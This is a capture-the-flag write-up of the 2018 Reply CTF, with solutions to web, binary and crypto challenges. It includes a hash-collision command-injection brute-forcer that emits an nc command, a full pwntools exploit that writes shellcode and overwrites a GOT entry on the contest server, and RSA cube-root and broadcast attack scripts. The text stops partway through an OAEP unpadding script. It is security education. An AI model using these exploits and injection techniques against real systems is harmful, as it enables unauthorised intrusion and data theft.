# 2018 Reply CTF
# TAEM:Vasif
# [ctfwebsite](https://challenges.reply.com/tamtamy/challenge/7/detail)

## WEB
#### WEB 100
First, I see the parameter prompt in the HTML source code. After adding the parameter, the image of the page will change every time. The image name is the base64 encoded fragment, and then I request multiple times to get all the fragments. Finally, splic the fragments and decoded to get the flag.
#### WEB 200

![](https://minio.sniperoj.com:443/hackmd/uploads/upload_4d5fde26102155025072fbbd94997adb.png)

![](https://minio.sniperoj.com:443/hackmd/uploads/upload_ffbbca3cf5827e7147eaaf8e120fe316.png)


```js
var arr = [
    'replace', 
    'fromCharCode', 
    'TYS{', 
    'leg', 
    '...', 
    'ttt', 
    'concat', 
    '_o0', 
    '_00', 
    'split', 
    'length', 
    'toLowerCase', 
    'join', 
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 
    'charAt', 
    'floor', 
    'random', 
    'set', 
    'E84AFAAB83ECB301B3D97CE4174D2773'
]; 

(
    function(arra, offset) {
        var trans = function(times) {
            while (--times) {
                arra['push'](arra['shift']());
            }
        };
        trans(++offset);
    } (arr, 0x10f)
);
var getItem = function(_0x361113, _0x259f22) {
    _0x361113 = _0x361113 - 0x0; // convert to integer
    var _0x7ee5c4 = arr[_0x361113];
    return _0x7ee5c4;
};


var Reflection = {
    '_0o': function() {
        /*
        Reflection['_0o']()
        "gfsasa3erp0z3fgusadaf3s3q0x2ghj3heda2 ads z lnm vsq azz sxxed"
        */
        var _0x51ae10 = 'de';
        var _0x4076f4 = 'xx';
        var _0x3850a1 = 's ';
        var _0x1c43dd = 'zz';
        var _0x4716f0 = 'a ';
        var _0x4b6831 = 'qs';
        var _0x89ac55 = 'v ';
        var _0x30b4a1 = 'mn';
        var _0x413219 = 'l ';
        var _0x36d369 = 'Z ';
        var _0x524039 = 'sd';
        var _0xa327f3 = 'A ';
        var _0x7d3821 = '2A';
        var _0x10e0ef = 'de';
        var _0x4ed828 = 'H3';
        var _0x3074ac = 'jH';
        var _0x2b36c7 = 'g2';
        var _0x49a2e2 = 'x0';
        var _0x176ef7 = 'Q3';
        var _0x47f001 = 's3';
        var _0x950c82 = 'F';
        var _0x117f90 = 'Ad';
        var _0x5bdb3f = 'as';
        var _0x4f9482 = 'uG';
        var _0x17699b = 'f3';
        var _0x346ddc = 'z0';
        var _0x168acd = 'Pr';
        var _0x4ed77d = 'e3';
        var _0x3045ae = 'as';
        var _0x5d7ca4 = 'ASFG';
        console.log(Reflection['ttt'](reverse_string(_0x51ae10['concat'](_0x4076f4)['concat'](_0x3850a1)['concat'](_0x1c43dd)['concat'](_0x4716f0)['concat'](_0x4b6831)['concat'](_0x89ac55)['concat'](_0x30b4a1)['concat'](_0x413219)['concat'](_0x36d369)['concat'](_0x524039)['concat'](_0xa327f3)['concat'](_0x7d3821)['concat'](_0x10e0ef)['concat'](_0x4ed828)['concat'](_0x3074ac)['concat'](_0x2b36c7)['concat'](_0x49a2e2)['concat'](_0x176ef7)['concat'](_0x47f001)['concat'](_0x950c82)['concat'](_0x117f90)['concat'](_0x5bdb3f)['concat'](_0x4f9482)['concat'](_0x17699b)['concat'](_0x346ddc)['concat'](_0x168acd)['concat'](_0x4ed77d)['concat'](_0x3045ae)['concat'](_0x5d7ca4))));
        return Reflection['ttt'](reverse_string(_0x51ae10['concat'](_0x4076f4)['concat'](_0x3850a1)['concat'](_0x1c43dd)['concat'](_0x4716f0)['concat'](_0x4b6831)['concat'](_0x89ac55)['concat'](_0x30b4a1)['concat'](_0x413219)['concat'](_0x36d369)['concat'](_0x524039)['concat'](_0xa327f3)['concat'](_0x7d3821)['concat'](_0x10e0ef)['concat'](_0x4ed828)['concat'](_0x3074ac)['concat'](_0x2b36c7)['concat'](_0x49a2e2)['concat'](_0x176ef7)['concat'](_0x47f001)['concat'](_0x950c82)['concat'](_0x117f90)['concat'](_0x5bdb3f)['concat'](_0x4f9482)['concat'](_0x17699b)['concat'](_0x346ddc)['concat'](_0x168acd)['concat'](_0x4ed77d)['concat'](_0x3045ae)['concat'](_0x5d7ca4)));
    },


    'swan': function(data) {
        // var _0x30c390 = Reflection['ttt'];
        var magic = 'AbCdeF123 4vGh0O$',

        table = '',
        result = '',
        key = md5(data);
        Reflection['ttt'] = rot13;

        if (key === Reflection['_o0']){
            table = Reflection['_00']();
        } 
        else {
            table = Reflection['_0o']();
        }

        console.log("Table:" + table)

        var table = table['split']('');
        for (var i = 0x0; i < table['length']; i++) {
            if (table[i] != ' ') {
                table[i] = magic[Math['floor'](Math['random']() * magic['length'])];
                result += table[i];
            } else {
                result += ' ';
            }
        }
        return result;
    },


    'ttt': function(data) {
        return data['toLowerCase']();
    }
};



function reverse_string(str) {
    return str['split']('')['reverse']()['join']('');
}



function rot13(data) {
    return (data + '')['replace'](/[a-zA-Z]/gi, function(arg) {
        return String['fromCharCode'](
            arg['charCodeAt'](0x0) + (
                arg['toLowerCase']() < 'n' ? 0xd: -0xd
            )
        );
    });
}


Reflection['_00'] = function() {
    /*
    "gfsasa3erp0z3fgusadaf3s3q0x2ghj3heda2 ads z lnm vsq azz sxxed"
    Reflection['_00']()
    "gel jvgu zvffvat punenpgref... naq v fnl vgf nyy evtug"
    "try with missing characters... And I say its all right"
    */
    var _0x59d52f = 'gu';
    var _0x1be54d = 'tv';
    var _0x395e49 = 'e ';
    var _0x327d60 = 'yy';
    var _0xabf61b = 'n ';
    var _0x3eb796 = 'fg';
    var _0x514e41 = 'v ';
    var _0x41de44 = 'ln';
    var _0x52e625 = 'f ';
    var _0x71da2f = 'V ';
    var _0x1e2340 = 'qa';
    var _0x42dd32 = 'N ';
    var _0x48d20d = '!}';
    var _0x38037e = 'ah';
    var _0x6c87f6 = 'F3';
    var _0x316239 = 'uG';
    var _0x3f4bcb = 'f3';
    var _0x2526d1 = 'z0';
    var _0x605702 = 'P3';
    var _0x1189b8 = 'e3';
    var _0x435cfe = 'U';
    var _0x16a9f5 = 'Ah';
    var _0xd46d0 = 'F3';
    var _0xcea26b = 'uG';
    var _0x50748c = 'f3';
    var _0x39f3fc = 'z0';
    var _0x4d8d1a = 'Pr';
    var _0x336168 = 'e3';
    var _0x554096 = 'U:';
    var _0x2dea0f = 'TYS{';
    var _0x145003 = 'fe';
    var _0x215914 = 'rg';
    var _0x3d6887 = 'pn';
    var _0x480781 = 'en';
    var _0x3a60af = 'up';
    var _0x3fa7ae = ' t';
    var _0x169340 = 'av';
    var _0x566782 = 'ff';
    var _0x331c75 = 'vz';
    var _0x3383e3 = ' u';
    var _0x535e1d = 'gv';
    var _0x2db1fe = 'j ';
    var _0x437e83 = 'leg';
    var _0x215c12 = '...';
    console.log(reverse_string(_0x59d52f['concat'](_0x1be54d)['concat'](_0x395e49)['concat'](_0x327d60)['concat'](_0xabf61b)['concat'](_0x3eb796)['concat'](_0x514e41)['concat'](_0x41de44)['concat'](_0x52e625)['concat'](_0x71da2f)['concat'](_0x1e2340)['concat'](_0x42dd32)['concat'](_0x215c12)['concat'](_0x145003)['concat'](_0x215914)['concat'](_0x3d6887)['concat'](_0x480781)['concat'](_0x3a60af)['concat'](_0x3fa7ae)['concat'](_0x169340)['concat'](_0x566782)['concat'](_0x331c75)['concat'](_0x3383e3)['concat'](_0x535e1d)['concat'](_0x2db1fe)['concat'](_0x437e83)));
    return Reflection['ttt'](reverse_string(_0x59d52f['concat'](_0x1be54d)['concat'](_0x395e49)['concat'](_0x327d60)['concat'](_0xabf61b)['concat'](_0x3eb796)['concat'](_0x514e41)['concat'](_0x41de44)['concat'](_0x52e625)['concat'](_0x71da2f)['concat'](_0x1e2340)['concat'](_0x42dd32)['concat'](_0x215c12)['concat'](_0x145003)['concat'](_0x215914)['concat'](_0x3d6887)['concat'](_0x480781)['concat'](_0x3a60af)['concat'](_0x3fa7ae)['concat'](_0x169340)['concat'](_0x566782)['concat'](_0x331c75)['concat'](_0x3383e3)['concat'](_0x535e1d)['concat'](_0x2db1fe)['concat'](_0x437e83)));
}



function randomString() {
    var data = '';
    var charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0x0; i < 0x5; i++){
        data += charset['charAt'](Math['floor'](Math['random']() * charset['length']));
    } 
    data = 'reply'
    Reflect['set'](Reflection, '_o0', 'E84AFAAB83ECB301B3D97CE4174D2773');
    return Reflection['swan'](data);
}
```

## BIN
#### BIN 100
TODO: 土味英语，需要润色
After analyze the program, I found that this program just like a sandbox where we can execute some command.
Look at this help menu:
```
 ===============
|   HELP MENU   |
 ===============
| * uname       |
| * help        |
| * exit        |
| * pwd         |
| * ls          |
| * ps          |
| * id          |
 ===============
```
It provides a list of commands that we can execute.
type `ls`, ahhh, there is a `flag.txt` under the working directory.
but how can we get the content of the `flag.txt`, if we type `cat flag.txt`, we will receive response of `Invalid command`. And we can execute command like `ps aux`, `uname -a` that are not provided in the help menu. but `ls -al` will failed... It's a little wired.

An questions occured in my mind, how does this program check the input is valid or not? a white list?
So we should dig deeper...

![](https://minio.sniperoj.com:443/hackmd/uploads/upload_4edc6a9fa52d5a70a572ae7e55f36a81.png)

I try to find some command string like:
```
ls
ps
ps aux
uname -a
```
but failed, these command is not in the `.data` segment or other segments.

these is a function (0x000014B8)
it takes the pointer of our input string, and returns a value.
then it involves the while loop at most 16 time to check whether the value equals to something.

![](https://minio.sniperoj.com:443/hackmd/uploads/upload_6c181260038a282efe1f69e7b4b37c32.png)

I suppose that is a hash function.
And this function maps the user input space to a 2byte space.
so it leads to a hash collision attack
to execute arbitary command, all we need to do is brute force some bytes which will not effect the command you want to execute
so this is the pattern I used
`[COMMAND]&&echo [JUNK]`
the command we want to execute is `cat flag.txt` (or `cat *`)
so we just need to brute force the `[JUNK]`
we put the whole command as argument into the hash function, keep trying until the return value appears in the built-in 8 values.
```
unsigned short builtin[] = {
    0xC027, 0x2564, 0x5772, 0xE56C, 0x3A96, 0x462C, 0xDB2E, 0xBB2F
};
```
talk is cheap, code like this:
```c
#include <stdio.h>
char data[0x400] = {0};
char * hash(char *result, unsigned int length)
{
	int v2; // r4
	char *v3; // r2
	char v4; // t1
	char *v5; // r5
	unsigned int v6; // lr
	signed int v7; // r12
	int v8; // r12
	signed int v9; // r3
	signed int v10; // r9
	int v11; // r8
	signed int v12; // r3
	signed int v13; // r12
	unsigned int v14; // r3
	char v15; // r12
	unsigned int v16; // r3
	char v17; // r12
	unsigned int v18; // r3
	char v19; // r12
	unsigned int v20; // r3
	char v21; // r12
	unsigned int v22; // r3
	char v23; // lr
	unsigned int v24; // r3

	v2 = (unsigned char)data[0];
	if ( data[0] )
	{
		if ( !result )
			return result;
		goto LABEL_3;
	}
	v5 = &data[2];
	do
	{
		v6 = (unsigned short)v2++;
		if ( v6 & 1 )
			v7 = -24575;
		else
			v7 = 0;
		v8 = v7 ^ (v6 >> 1);
		if ( v6 & 1 )
			v9 = 30720;
		else
			v9 = 20480;
		if ( v6 & 1 )
			v10 = 10240;
		else
			v10 = 0;
		v11 = v8 & 1;
		if ( v8 & 1 )
			v10 = v9;
		if ( v6 & 1 )
			v12 = 20480;
		else
			v12 = 0;
		if ( v6 & 1 )
			v13 = -4095;
		else
			v13 = -24575;
		if ( !v11 )
			v13 = v12;
		v14 = v10 ^ 0xA001;
		if ( !((v13 ^ (v6 >> 2)) & 1) )
			v14 = v10;
		v15 = v14 ^ (v6 >> 3);
		v16 = v14 >> 1;
		if ( v15 & 1 )
			v16 ^= 0xA001u;
		v17 = v16 ^ (v6 >> 4);
		v18 = v16 >> 1;
		if ( v17 & 1 )
			v18 ^= 0xA001u;
		v19 = v18 ^ (v6 >> 5);
		v20 = v18 >> 1;
		if ( v19 & 1 )
			v20 ^= 0xA001u;
		v21 = v20 ^ (v6 >> 6);
		v22 = v20 >> 1;
		if ( v21 & 1 )
			v22 ^= 0xA001u;
		v23 = v22 ^ (v6 >> 7);
		v24 = v22 >> 1;
		if ( v23 & 1 )
			*((short *)&v24) = v24 ^ 0xA001;
		*((short *)v5 + 1) = v24;
		v5 += 2;
	}
	while ( v2 != 256 );
	data[0] = 1;
	if ( result )
	{
LABEL_3:
		if ( length )
		{
			v3 = &result[length];
			length = 0;
			do
			{
				v4 = *result++;
				length = *(unsigned short *)&data[2 * (unsigned char)(v4 ^ length) + 4] ^ (length >> 8);
			}
			while ( result != v3 );
		}
		result = (char *)length;
	}
	return result;
}


int main(int argc, char** argv){
	// char* command = "cat flag.txt";
	char* command = argv[1];
	char* password = "L39ZTvwaHegpVb9";
	char* host = "challengebox.reply.it";
	int port = 42763;
	char buffer[0x400] = {0};                 
	unsigned char i = 0;                            
	unsigned char j = 0;
	unsigned char k = 0;
	unsigned int l = 0;
	unsigned short result = 0;
	unsigned short table[] = {
		0xC027, 0x2564, 0x5772, 0xE56C, 0x3A96, 0x462C, 0xDB2E, 0xBB2F
	};
	for(i = 0x20; i<0x80; i++){             
		for(j = 0x20; j<0x80; j++){             
			for(k = 0x20; k<0x80; k++){             
				sprintf(buffer, "%s&&echo %c%c%c",command,i,j,k);   
				result = hash(buffer, strlen(buffer));
				for(l = 0; l<sizeof(table); l++){             
					if(result == table[l]) {
						goto FOUND;
					}
				}                                     
			}                                     
		}                                     
	}                                     
FOUND:
	printf("python -c 'print \"%s\\n%s&&echo \\x%02x\\x%02x\\x%02x\\n\"'|nc %s %d", password, command, i, j, k, host, port);
}
```

#### BIN 200
The main function consists of lots of if statements like:
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_451f339139cd0ed15e93a2b4cd8c3169.png)
Most of them are useless, but i found some of these if statements judge the single byte of flag is right or wrong，such as
```
if ( (unsigned __int8)(a2[1][16] + 73) != 155 )
    return 0xFFFFFFFFLL;
```
it checks a byte of flag is right or wrong, so i searched all the if statements like this and calculate the flag. 
#### BIN 300
This is a challenge of architecture gameboy, I am used to use radare2 to analyze this kind of rev challenges. But I have to do other preparation before it.

First I google this architecture and then find that it's cpu architecture of GBA. And It's easily to find relative documents and tools about it, this is helpful.

I found some emulators to run the rb file on [emuparadise](https://www.emuparadise.me/Nintendo_Gameboy_Advance_Emulators/31). What I see is shown below when I run the challenge file with visualboyadvance-m:
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_56511f7474fac623b404aaef1521a534.png)
It's just a picture and seems to be helpless. But we can search the string in r2 with cmd`izz~R-Boy found this` and find a string at offset 0xa32. I think the string may lead to sth, so I find reference to that string with`pd 2048~a32`. This command show following asm code:
```
|           0x000001c7      cd5a32         call fcn.0000325a
        |   0x000008a6      11320a         ld de, 0x0a32
      ,===< 0x00000a32      2052           jr nZ, 0x52
```
It's easily to tell that code at 0x8a6 refer to that string. So I seek to that place ad analyze that function at 0x883
```
|           0x000008a6      11320a         ld de, 0x0a32
|           0x000008a9      d5             push de
|           0x000008aa      cdf812         call fcn.000012f8
```
It's easy to know that fcn.000012f8 is a print function by patching the call and rerun the program in emulator.
I noticed that there are another 2 references to fcn.000012f8 by typing `axt @ fcn.000012f8`, they are probably going to print flag. So I check them, and found that call at 0x05a6 take parameter "%c". 
Wow, we may be very close, so I analyze the function at 0x52a, and find something like check, and after those checks, there is a loop that call likely`show("%c", b)`:
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_650cca678bd72683727c3e63f62f3ba7.png)
we can find that what the "%c" print are bytes which are xor result of a given string "A|v}\x00m\x09Sh^ewzYR\x0dT\x09eohvG" and another byte from our joypad's input.
Since there is only one byte we can bruteforce it and finaly we get the flag:
`{FLG:W3iRd_M@ch7n3_URL}`


#### BIN 400
At the first look at the program, I'm quite sure it's about protocol reversing though It's a pwn finally. And after some reverse engineering, I conclude the operations we can take provided by the program:
```
write memory
read memory
calculate
    and
    rshift
    xor
    assign
    lshift
    sub
    mul
    or
    add
```
all these operations are relative to 11 registers on stack. and all operations are done with those regs, for example the write operation are going to write address which stored in the memory. There are many details about the protocol you'd better reverse the program yourself to understand all of them.
Now we've known we can store any value in our stack registers and then read and write arbitrary memory, the next to do is to get shell. But before that we have to solve some problems.

First thing to solve is how to get the memory address we need. Note that, we have can only send one packet with commands and the server will not give us any feedback, and the checksec shows:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
That reveals that we can write GOT, we can write shellcode to rwx segment, but we don't know where the elf is loaded. 
To solve this problem, we can use the first vunerablity of the program, that is the program doesn't initialize the registers on stack, and addresses we need can be found there. In fact, we can find address in elf address space and address in libc space. To use the libc addr I have to dump the libc, but it's not efficient. But with the elf addr we can calculate address of GOT and address of RWX segment, then we can write shellcode to rwx segment and modify fprintf got entry and triger it by appending an invalid command item to our packet.

The second problem is how we get the output of program since the fd of tcp connection is dup to a random value? The problem is easy to solve but take me lots of time because of some accident try. We only need to write a loop in our shellcode to write content to every fd, It eventually will write flag to our terminal. So the shellcode need to do follow things:
```
open flag.txt
read flag.txt to buf
set fd to 4
tag:
    write to fd
    inc fd
    jmp to tag
```
(PS: You can't open a shell or do reverse shell binding because the program is totally based on tcp connection and chroot to user directory)
Here is full exp:
```python
from pwn import *
from time import sleep
from keystone import *
from keystone.x86_const import *

MODE_8 = 0x10
MODE_16 = 0x8
MODE_32 = 0
MODE_64 = 0x18

MODE_REG = 8
MODE_IMM = 0

OP_AND = 0x80
OP_RSHIFT = 0x70
OP_XOR = 0xA0
OP_ASSIGN = 0xB0
OP_LSHIFT = 0x60
OP_SUB = 0x10
OP_MULTIPLE = 0x20
OP_OR = 0x40
OP_ADD = 0x00

def rmt_write(src, dst, offset, mode):
    cmd = 0
    cmd |= 3 # class type
    cmd |= 0x60 # mode
    cmd |= mode # bit mode
    reg = src << 4 | dst # regs
    cmd |= reg << 8
    cmd |= offset << 16 # offset
    return cmd

def rmt_read(src, dst, offset, mode):
    cmd = 0
    cmd |= 0 # class type
    cmd |= 0x40 # mode
    cmd |= mode # bit mode
    reg = src << 4 | dst # regs
    cmd |= reg << 8
    cmd |= offset << 16 # offset
    return cmd

def rmt_calc(dst, value, op, mode=MODE_IMM):
    cmd = 0
    cmd |= 7 # class type
    cmd |= mode 
    cmd |= op # op
    cmd |= dst << 8 # dst
    if mode == MODE_IMM:
        cmd |= value << 32 # value
    else:
        cmd |= value << 12 # src
    return cmd

def pack_cmds(cmds):
    packet = ''
    for cmd in cmds:
        packet += p64(cmd)
    return packet

cmds = [rmt_write(10, 10, 0, MODE_16)]

sc_value = []
context.arch='amd64'

sc_asm = '''
xor rdx, rdx
xor rsi, rsi
xor rbx, rbx
push 0
mov rbx, 0x7478742e67616c66
push rbx
mov rbx, rsp
push rbx
pop rdi
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x800
mov rdx, 0x100
mov rax, 0
syscall

mov rdi, 4
tag:
xor rcx, rcx
mov rax, 1
syscall
inc rdi
jmp tag
'''
ks = Ks(KS_ARCH_X86, KS_MODE_64)
shellcode = ''.join(map(lambda c:chr(c), ks.asm(sc_asm)[0]))
for i in range(0, len(shellcode), 8):
    sc_value.append(u64(shellcode[i:i+8].ljust(8, '\x00')))

# get elf base at reg4
leak_item = 7
cmds.append(rmt_calc(leak_item, 0x555555557333 - 0x555555554000, OP_SUB, MODE_IMM))

# get rwx base at reg1
cmds.append(rmt_calc(1, leak_item, OP_ASSIGN, MODE_REG))
cmds.append(rmt_calc(1, 0x555555562000 - 0x555555554000, OP_ADD, MODE_IMM))

# write shell code to rwx segment
offset = 0
for val in sc_value:
    val_hi = (val >> 32) & 0xffffffff
    val_low = val & 0xffffffff
    cmds.append(rmt_calc(10, val_hi, OP_ASSIGN, MODE_IMM))
    cmds.append(rmt_calc(9, val_low, OP_ASSIGN, MODE_IMM))
    cmds.append(rmt_calc(8, 32, OP_ASSIGN, MODE_IMM))
    cmds.append(rmt_calc(10, 8, OP_LSHIFT, MODE_REG))
    cmds.append(rmt_calc(10, 9, OP_OR, MODE_REG))
    cmds.append(rmt_write(10, 1, offset, MODE_64))
    offset += 8

# get got addr at reg2
cmds.append(rmt_calc(2, leak_item, OP_ASSIGN, MODE_REG))
cmds.append(rmt_calc(2, 0x60C0, OP_ADD, MODE_IMM))

# write got to shellcode addr
cmds.append(rmt_write(1, 2, 0, MODE_64))

cmds.append(0xffffffffffffffff)

context.log_level='debug'
# io = remote("10.211.55.11", 52112)
io = remote("challengebox.reply.it", 52112)

io.sendlineafter('Password:', "workbenchzebra")
sleep(1)
io.send(p16(len(cmds) * 8))
sleep(1)
io.send(pack_cmds(cmds))
io.interactive()
```

## CRYPTO
#### CRYPTO 100
This challenge gives us a encrypt script and the encrypted file. After analyse the script i found the key is the md5 of a unknow string, and the key just xor the first 32 bytes of plaintext. Once a byte of plaintext was encrypted by key,it will be added to the end of the key and encrypt the thirty-second byte in plaintext behind it.

![](https://minio.sniperoj.com:443/hackmd/uploads/upload_34a781aa42ef6f854237c72452d62e13.png)
 so we can know that:
```
whole key = md5 + plaintext[0:len(plainttext-32)]
```
The last 65 bytes of plaintext were given to us,so we can use these bytes we know to xor the ciphertext and recover the plaintext.
#### CRYPTO 200
we are given a file,format is data.
```bash
$ xxd encrypted  
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0004 81eb bfd9  ................
00000040: d5fc af91 5145 658f af3a 0e86 cd8b d388  ....QEe..:......
00000050: 3672 699c ed7d 6387 e0e3 a3fa 68c4 921f  6ri..}c.....h...
00000060: 490e 9ef1 abdc 9f27 ed5f 63e5 add5 7148  I......'._c...qH
00000070: 4239 ebfe a878 af5e e85d 54aa de15 d938  B9...x.^.]T....8
00000080: 467b 92cc 8c07 eb4c d8f1 7c14 295b 2986  F{.....L..|.)[).
00000090: 036d d3b9 ad2d ebd1 4888 0d95 68de 2977  .m...-..H...h.)w
000000a0: f025 2289 0cb9 47d0 4b3c 3f8f 8b92 3a04  .%"...G.K<?...:.
000000b0: e6e6 97d4 94ea 691d 785f 27b8 32d7 42da  ......i.x_'.2.B.
000000c0: e5c9 9d20 6400 f008 3120 2063 31df 292b  ... d...1  c1.)+
000000d0: 2e4e b3a8 c847 7479 429d fcc6 2d55 2993  .N...GtyB...-U).
000000e0: 243e c46d 2bfe a96e afee 0d43 2fe9 4b9f  $>.m+..n...C/.K.
000000f0: ff69 106d 8a16 5e01 271a 19d1 be74 2517  .i.m..^.'....t%.
```
No idea at all how to deal with such file. The organizer gives a hint:**RSA**.OMG!!!, this is a rsa encrypted ciphertext, since N is very big and e == 3, so just iroot will recover the message.
```python
In [88]: c = libnum.s2n(open("encrypted","rb").read())

In [89]: gmpy2.iroot(c,3)
Out[89]: 
(mpz(36001706850048626081616756397544766323378529843646894139063979460807316087805406326896319186794271430700374100321464141081227735087166902804037513083134309703L),
 True)

In [90]: m = libnum.n2s(3600170685004862608161675639754476632337852984364689413906397946
    ...: 0807316087805406326896319186794271430700374100321464141081227735087166902804037
    ...: 513083134309703L)

In [91]: m
Out[91]: '\n}!Erc33Qre0Z:TYS{ :ryvs CVM rug ebs qrra hbl qebjffnc rug fv fvuG'

In [92]: m[::-1]
Out[92]: 'Guvf vf gur cnffjbeq lbh arrq sbe gur MVC svyr: {SYT:Z0erQ33crE!}\n'
```
the message is encrypted with rot13, so recover the flag easily with [rot13](https://www.rot13.com/):
> flag: This is the password you need for the ZIP file: {FLG:M0reD33peR!}\a
#### CRYPTO 300
The task is a zip file.After unzip it, we get following message:
```bash
$ tree -al
.
└── home
    ├── .cargo
    │   └── bin
    │       └── base100
    ├── .keys
    │   ├── pubkey1.pem
    │   ├── pubkey2.pem
    │   └── pubkey3.pem
    └── Mail
        └── mbox

5 directories, 5 files
```
Gather infomation about this task.
> [base100](https://github.com/AdamNiederer/base100)
> three public key with same small e=3, different n, where n1,n2,n3 are coprime!!! **RSA Broadcast Attack**

```python
In [1]: from Crypto.PublicKey import RSA
   ...: import libnum
   ...: import gmpy2
   ...: from base64 import b64decode
   ...: 
   ...: pubkey1 = RSA.importKey(open("pubkey1.pem").read())
   ...: pubkey2 = RSA.importKey(open("pubkey2.pem").read())
   ...: pubkey3 = RSA.importKey(open("pubkey3.pem").read())
   ...: 
   ...: print pubkey1.e
   ...: print pubkey1.n
   ...: print pubkey2.e
   ...: print pubkey2.n
   ...: print pubkey3.e
   ...: print pubkey3.n
   ...: 
3
27461240938102113200897173472967117338353862970941479631898743934439184197969934730421588916770108706224321742970311802597907483875609117760952915265756915294486519317125835465418552076936263931036418365556660176672606176106318417615958887675615338303963762961998856932289910599261987402794316615599785954321753677197523630402223417275683243800227784909335489404425069775641916510995967254516594807225839598278056365795172532519304391163607769926236805051039642128965112622904014731728182688108488411683515618049320040345518530697006867452564716512399415241092660425414925204178980508521843356874071745125098712077791
3
25729532341092451294531240603979387891663269068925054494644386447578709538200549712194324331007743028407877103888307741934091188143756407222013624779702720382290917003294354053966450051814520421244144339391097773024828092387419578916453522185035851539262003539885806395088735959181862514614229921786903329704181960249900130677918888765813680940161977058425292413968501075642196333018628709714141901549219827667311632057818616952262615085737788512392215874195073722498312750592119469762621027655590907702680840657024789619809001294983274111682135324576250517371609393192128069012335661245230141212036326263247368005689
3
29661948132724964616095227795746368402358545784349784235600286377577202933753742052817012601591239801737226934962433653612275935566949707251578632051160376815074974965336910509163875821813472719201779847254599350700653608857398233061073396334555963939196712932498499399996860568569382780663583671102602093159824399656695189722850049090469151885610779385863063132511776225957936227987230406946647771700809951438597193908730256108719036670783287005944737089408722773951543044620377048323576847162239724281695947755648729836251903019780637774106001635595520380198874977211295888721560409084906124570980428674700109696853
```
> mbox contains three ciphertexts encrypted with three rsa public key the encrypted with base100.

**broadcast attack on rsa solver.py**
```python
import libnum
from functools import reduce
import gmpy
import json, binascii

def modinv(a, m):
    return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))

def chinese_remainder(n, a):
    sum = 0
    prod = reduce(lambda a, b: a * b, n)
    for n_i, a_i in zip(n, a):
        p = prod // n_i
        sum += a_i * modinv(p, n_i) * p
    return int(sum % prod)

nset = []
cset = []
nset.append(pubkey1.n)
nset.append(pubkey2.n)
nset.append(pubkey3.n)
cset.append(libnum.s2n(cc1))
cset.append(libnum.s2n(cc2))
cset.append(libnum.s2n(cc3))
m = chinese_remainder(nset, cset)
m = int(gmpy.mpz(m).root(3)[0])
print libnum.n2s(m)

#plaintext
'''T\xf8\xb5a\xceT\x8a\xe0\xad\x93vO/7\xfa\xd2\xb1\xb3H\xf9R\xc2\xbf\x85_\x80\xb9\x86\xda!\x19\xd4~\x14y\xbaO\x93\xb9\xbd<\x85\x8e\xf2\xd4\xe5\xbb\t\x9daD\xea\xfb\xd3u\xa6\xd3m\x00\xbd\xbeyE\x1f+\xc0\x02/r\x00!\x02\xcb\xb5\xbf\xb0\xb1\xbaVK\x8e\x17\x17$\x07x\xc0\xe8v\x9e )\xd0 a\xbd\xf7\xda\xbf\xf8\x97\xc30;k\xf8\x10\x91\x8f\x9aC\x8e,\xf2H\x9c\xa4HU\xcc\x8b\xd6\x86\x98\xe1\x89\x16`.\xe1\x18\xff\xb5\x9b\x95 H\x05\xdb\x81\xfaq+\x93\x90edRV\x13x\xd4\xcbS\xd6q\x8e\xc5\xcfoht\xce9\xf8\x14\xe2\xb0\xf5 \x00\x86! Q\xa4O\xa3\xf9\x96L\xb7\xd7\x0f\xa6\xa8\xd1\xecKy#%U.\x9e\xc9\x99a\xc6\xa7!\x1e\xb0\xeb\xc5\x10\x12[\xc3\x00k\xc9eQi\xbbt@8@\xf8\xd3\x8a\xb9\x84\xba\x8bk\xe31\xc2\xc8]&\xde\x03\x1d\xdd>\xed\xd6\xc1\xfcl|\xd9\x00\x02\xb2\xdf\xf4=\x975\x99
'''
```

FLAG is not in the plaintext, so the plaintext must padded. After google. i found this common padding scheme for rsa:[OAEP](https://tools.ietf.org/html/rfc3447#section-7.1)

**unpadding script modified on [github](https://github.com/bdauvergne/python-pkcs1)**
```python
import hashlib
import binascii
import exceptions


def xor(a, b):                  
  return ''.join(chr(ord(i) ^ ord(j)) for i, j in zip(a, b))
def integer_ceil(a, b):
    '''Return the ceil integer of a div b.'''
    quanta, mod = divmod(a, b)
    if mod:
        quanta += 1
    return quanta

def integer_byte_size(n):
    '''Returns the number of bytes necessary to store the integer n.'''
    quanta, mod = divmod(integer_bit_size(n), 8)
    if mod or n == 0:
        quanta += 1
    return quanta

def integer_bit_size(n):
    '''Returns the number of bits necessary to store the integer n.'''
    if n == 0:
        return 1
    s = 0
    while n:
        s += 1
        n >>= 1
    return s

def bezout(a, b):
    '''Compute the bezout algorithm of a and b, i.e. it returns u, v, p such as:

          p = GCD(a,b)
          a * u + b * v = p

       Copied from http://www.labri.fr/perso/betrema/deug/poly/euclide.html.
    '''
    u = 1
    v = 0
    s = 0
    t = 1
    while b > 0:
        q = a // b
        r = a % b
        a = b
        b = r
        tmp = s
        s = u - q * s
        u = tmp
        tmp = t
        t = v - q * t
        v = tmp
    return u, v, a

def i2osp(x, x_len):
    '''Converts the integer x to its big-endian representation of length
       x_len.
    '''
    if x > 256**x_len:
        raise exceptions.IntegerTooLarge
    h = hex(x)[2:]
    if h[-1] == 'L':
        h = h[:-1]
    if len(h) & 1 == 1:
        h = '0%s' % h
    x = binascii.unhexlify(h)
    return b'\x00' * int(x_len-len(x)) + x

def os2ip(x):
    '''Converts the byte string x representing an integer reprented using the
       big-endian convient to an integer.
    '''
    h = binascii.hexlify(x)
    return int(h, 16)

def mgf1(mgf_seed, mask_len, hash_class=hashlib.sha1):
    '''
       Mask Generation Function v1 from the PKCS#1 v2.0 standard.

